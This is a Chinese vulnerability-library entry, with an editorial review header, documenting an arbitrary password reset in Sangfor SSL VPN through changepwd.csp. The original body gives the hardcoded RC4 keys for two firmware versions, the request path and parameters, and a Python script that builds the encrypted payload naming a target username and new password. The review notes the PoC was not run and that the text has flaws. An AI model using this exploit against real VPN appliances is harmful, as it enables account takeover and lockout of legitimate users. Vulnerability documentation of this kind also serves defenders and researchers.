---
source: "白阁文库 BaizeSec/bylibrary"
id: "vw-dbe2f24545d6a241faee3f5a"
entity_id: "ve-dbe2f24545d6a241faee3f5a"
schema_version: "1"
title: "深信服VPN任意密码重置"
product: "Sangfor SSL VPN"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "已知M7.6.6R1/7.6.1不同key；其他待测"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE.md"
review_date: "2026-10-02"
side_effects: "账户操作会新增用户或更改认证材料，可能使原用户失去访问；须核对角色、操作前账户状态及恢复路径"
source_status: "unknown"
---

# 深信服VPN任意密码重置

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Sangfor SSL VPN
- 本文讨论：changepwd.csp RC4任意改密
- 版本、权限与配置前提：已知M7.6.6R1/7.6.1不同key；其他待测
- 资料类型：VPN改密PoC残缺转载；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 围栏黏连错误，计算RC4_STR_LEN标题下代码只print密文不输出长度
- Python2依赖未标；缺332给出的已修复排除条件；正文第二frontmatter
- 已落实的文本修订：“M7.6.1 key 为 20100720```”改为“M7.6.1 key 为 20100720 /  / ```http”；“`````` / 计算RC4_STR_LEN脚本 / ”改为“``` /  / 计算RC4_STR_LEN脚本 /  / ```python / ”。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 账户操作会新增用户或更改认证材料，可能使原用户失去访问；须核对角色、操作前账户状态及恢复路径

### 待核与来源

- 长度取hex字符或字节以及修复范围待回源
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


---
title: '深信服VPN任意密码重置'
date: Thu, 17 Sep 2020 04:56:37 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 漏洞范围

已知M7.6.6R1 M7.6.1 其他版本有待测试

### 漏洞POC

M7.6.6R1 key 为 20181118 M7.6.1 key 为 20100720

```http
https://<path>/por/changepwd.csp

sessReq=clusterd&sessid=0&str=RC4_STR&len=RC4_STR_LEN 
```

计算RC4_STR_LEN脚本

```python
from Crypto.Cipher import ARC4
from binascii import a2b_hex

def myRC4(data,key):
    rc41 = ARC4.new(key)
    encrypted = rc41.encrypt(data)
    return encrypted.encode('hex')


def rc4_decrpt_hex(data,key):
    rc41 = ARC4.new(key)
    return rc41.decrypt(a2b_hex(data))
key = '20100720'
data = r',username=TARGET_USERNAME,ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=TARGET_PASSWORD,'
print myRC4(data, key) 
```


---

> 来源：白阁文库 BaizeSec/bylibrary
